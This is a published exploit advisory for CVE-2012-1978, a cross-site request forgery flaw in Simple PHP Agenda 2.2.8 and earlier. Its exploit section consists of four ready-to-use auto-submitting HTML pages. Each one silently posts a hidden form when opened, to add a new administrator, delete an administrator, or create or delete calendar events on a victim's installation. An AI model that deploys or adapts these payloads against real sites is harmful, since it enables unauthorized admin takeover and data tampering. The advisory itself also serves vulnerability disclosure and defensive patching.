@@ -1,0 +1,86 @@
+                                                                     
+                                                                     
+                                                                     
+                                             
++--------------------------------------------------------------------------------------------------------------------------------+
+# Exploit Title       : Simple PHP Agenda <= 2.2.8 CSRF (Add Admin - Add Event)
+# Date                : 29-03-2012
+# Author              : Ivano Binetti (http://ivanobinetti.com)
+# Software link       : http://sourceforge.net/projects/php-agenda/files/latest/download
+# Version             : 2.2.8 and lower 
+# Tested on           : Debian Squeeze (6.0) 
+# Original Advisory   : http://www.webapp-security.com/2012/03/simple-php-agenda/
+# CVE                 : CVE-2012-1978
+# OSVDB-ID            : 80793
+# Secunia Advisory ID : 48685 
+# Other Advisory      : http://packetstormsecurity.org/files/111408/Simple-PHP-Agenda-2.2.8-Cross-Site-Request-Forgery.html
++--------------------------------------------------------------------------------------------------------------------------------+
+Summary
+1)Introduction
+2)Vulnerabilities Description
+3)Exploit
+  3.1 Add Administrator 
+  3.2 Delete Existing Administrator
+  3.3 Add a New Event
+  3.4 Delete an Existing Event
++--------------------------------------------------------------------------------------------------------------------------------+
+1)Introduction
+Simple Php Agenda is "a simple agenda tool written in PHP with MySQL backend. An agenda tool accessible everywere there's 
+internet".
+
+2)Vulnerabilities Description
+Simple Php Agenda 2.2.8  (and lower) is affected by a CSRF Vulnerability which allows an attacker to add a new administrator,
+delete an existing administrator, create/delete a new event and change any other parameters. In this document I will only 
+demonstrate how to: 
+- add a new administrator
+- delete a existing administrator
+- add a new event
+- delete an existing event.
+Other parameters can be also modified.
+
+3)Exploit 
+ 3.1 Add Administrator
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <form method="POST" name="form0" action="http://<Simple_Php_Agenda_ip>:80/auth/process.php">
+ <input type="hidden" name="user" value="newadmin"/>
+ <input type="hidden" name="pass" value="password"/>
+ <input type="hidden" name="email" value="email@email.com"/>
+ <input type="hidden" name="subjoin" value="1"/>
+ </form>
+ </body>
+ </html>
+
+  
+ 3.2 Delete Existing Administrator
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <form method="POST" name="form0" action="http://<Simple_Php_Agenda_ip>:80/auth/admin/adminprocess.php">
+ <input type="hidden" name="deluser" value="pippo2"/>
+ <input type="hidden" name="subdeluser" value="1"/>
+ </form>
+ </body>
+ </html>
+
+ 3.3 Add a New Event
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <form method="POST" name="form0" action="http://<Simple_Php_Agenda_ip>:80/engine/new_event.php">
+ <input type="hidden" name="date" value="2012-03-30"/>
+ <input type="hidden" name="time" value="16%3A30"/>
+ <input type="hidden" name="title" value="new_event_title"/>
+ <input type="hidden" name="description" value="event_description"/>
+ <input type="hidden" name="newEvent" value="Aggiungi+evento"/>
+ </form>
+ </body>
+ </html>
+
+ 3.4 Delete an Existing Event
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <form method="POST" name="form0" action="http://<Simple_Php_Agenda_ip>:80/phpagenda/?deleteEvent=2">
+ </form>
+ </body>
+ </html>
++--------------------------------------------------------------------------------------------------------------------------------+
+  
